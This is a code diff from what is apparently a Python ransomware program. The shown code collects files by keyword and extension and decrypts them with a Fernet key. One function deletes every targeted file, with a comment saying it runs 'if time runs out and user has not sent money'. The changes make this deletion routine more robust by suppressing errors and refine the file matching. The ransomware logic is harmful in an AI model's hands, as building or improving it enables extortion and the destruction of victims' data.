@@ -13,7 +13,8 @@ def generate_file_list_keyword(path):
             for w in words:
                 file_name,file_ext = os.path.splitext(root+'\\'+file)
                 if w in ''.join([c for c in file_name.lower() if c.islower()]) and file_ext in encrypted_ext:
-                        file_paths.append(root+'\\'+file)
+                    file_paths.append(root+'\\'+file)
+                    break
     return file_paths
 
 #Creates a list of files of certain extensions
@@ -68,7 +69,10 @@ def decrypt_files(file_paths, fernet):
 #Function to delete all files from the file path from the computer; used if time runs out and user has not sent money.
 def delete_everything(file_paths):
     for f in file_paths:
-        os.remove(f)
+        try:
+            os.remove(f)
+        except:
+            pass
 
 def get_path(filename):
     if hasattr(sys, "_MEIPASS"):
